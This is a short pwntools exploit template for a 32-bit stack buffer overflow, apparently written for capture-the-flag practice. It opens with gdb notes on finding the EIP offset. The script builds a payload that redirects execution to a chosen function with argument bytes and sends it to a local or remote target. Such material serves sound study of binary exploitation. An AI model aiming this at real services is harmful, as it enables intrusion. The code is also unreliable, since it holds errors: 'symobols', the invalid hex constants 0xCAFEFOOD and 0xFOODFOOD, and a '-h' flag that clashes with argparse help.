# gdb <file>
# pattern create -> put it -> pattern offset $eip -> get <offset>
# disas <func> -> b *<specific bytes for breakpoint>
# x $ebp+0x8: show bytes in ebp + 0x8 location
#!/usr/bin/env python3

import argparse
import pwn

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--host", "-h", default="", type=str, required=False)
parser.add_argument("--port", "-p", default=0, type=int, required=False)
args = parser.parse_args()
elf = pwn.ELF("<file>")

offset = <offset>
new_eip = pwn.p32(elf.symbols["<func>"])
return_address = pwn.p32(elf.symobols["main"])
payload = b"".join([b"A"*offset, 
new_eip, 
return_address,
pwn.p32(0xCAFEFOOD), # required bytes
pwn.p32(0xFOODFOOD), # required bytes
b"\n"])

with open("payload", "wb") as flip:
  flip.write(payload)

#g = pwn.gdb.attach(p,   # line for debugging using gdb
#    gdbscript = """
#    b *<func>
#    r < payload
#""")


if args.destination == "local":
  p = elf.process()
elif args.destination == "remote":
  if not args.host or not args.port:
    pwn.warning("Supply -h for host and -p for port")
    exit()
  p = pwn.remote(args.host, args.port)

p.sendline(payload)
p.interactive()
